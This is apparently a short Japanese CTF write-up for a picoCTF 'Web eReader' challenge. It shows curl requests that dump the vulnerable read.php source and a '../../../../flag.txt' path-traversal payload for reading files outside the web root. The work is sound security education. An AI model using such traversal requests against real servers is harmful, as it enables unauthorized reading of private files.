```bash
$ curl http://saturn.picoctf.net:50561/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Web eReader</title>
  </head>
  <body>

    <h1>Web eReader</h1>

    <p>..</p>
    <p>divine-comedy.txt</p>
    <p>oliver-twist.txt</p>
    <p>the-happy-prince.txt</p>

    <form role="form" action="read.php" method="post">
      <input type="text" name="filename" placeholder="Filename" required></br>
      <button type="submit" name="read">Read</button>
    </form>
  </body>
</html>
```

POSTのaction先は``read.php``らしい。こいつ自身を読み取らせてみる。  

```bash
$ curl -X POST -d 'filename=read.php' http://saturn.picoctf.net:50561/read.php
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Web eReader</title>
  </head>
  <body>

    <!DOCTYPE html>
<br><html lang="en">
<br>  <head>
<br>    <meta charset="UTF-8">
<br>    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<br>    <meta http-equiv="X-UA-Compatible" content="ie=edge">
<br>    <link rel="stylesheet" href="style.css">
<br>    <title>Web eReader</title>
<br>  </head>
<br>  <body>
<br>
<br>    <?php
<br>      $firstChar = $_POST['filename'][0];
<br>
<br>      if( strcmp($firstChar, '/') == 0 )
<br>      {
<br>        echo "Not Authorized";
<br>      }
<br>      else
<br>      {
<br>        if (file_exists($_POST['filename'])) {
<br>
<br>          $file = fopen($_POST['filename'], 'r');
<br>
<br>          while(! feof($file))
<br>          {
<br>            $line = fgets($file);
<br>            echo $line. "<br>";
<br>          }
<br>
<br>          fclose($file);
<br>        } else {
<br>          echo "File does not exist";
<br>        }
<br>      }
<br>    ?>
<br>  </body>
<br></html>
<br><br>  </body>
</html>
```

パラメータのバリデーションが非常におそまつ。  

これで取得可能。  

```bash
$ curl -X POST -d 'filename=../../../../flag.txt' http://saturn.picoctf.net:50561/read.php
```

ちなみにディレクトリトラバーサルに対しては対策されていた。ステータスコードがなぜか500だけど。  
